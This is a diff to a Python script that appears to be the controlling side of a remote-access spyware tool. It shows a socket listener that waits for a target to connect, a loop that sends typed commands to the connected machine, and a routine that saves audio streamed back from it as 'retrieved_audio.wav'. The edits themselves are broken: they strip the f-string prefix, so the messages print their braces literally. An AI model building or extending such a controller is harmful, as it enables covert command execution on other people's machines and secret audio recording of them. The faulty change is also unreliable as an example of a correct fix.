@@ -16,7 +16,7 @@ try:
     koneksi = soc.accept()
     _target = koneksi[0]
     ip = koneksi[1]
-    print(+f'Connected to {str(ip)}')
+    print('Connected to {str(ip)}')
 except KeyboardInterrupt:
     print('exiting listener')
     sys.exit()
@@ -69,7 +69,7 @@ def keystroke():
           print('Connect')
           conn, addr= s.accept()
           with conn:
-               print(+f'connected {addr}')
+               print('connected {addr}')
                while True:
                     command = input('text: ')
                     conn.sendall(command.encode())
@@ -95,7 +95,7 @@ def receive_and_save():
                          if not data:
                               break
                          frames.append(data)
-          print(+'saving WAV file')
+          print('saving WAV file')
           WAVE_OUTPUT = 'retrieved_audio.wav'
           with wave.open(WAVE_OUTPUT, 'wb') as wf:
                wf.setnchannels(CHANNELS)
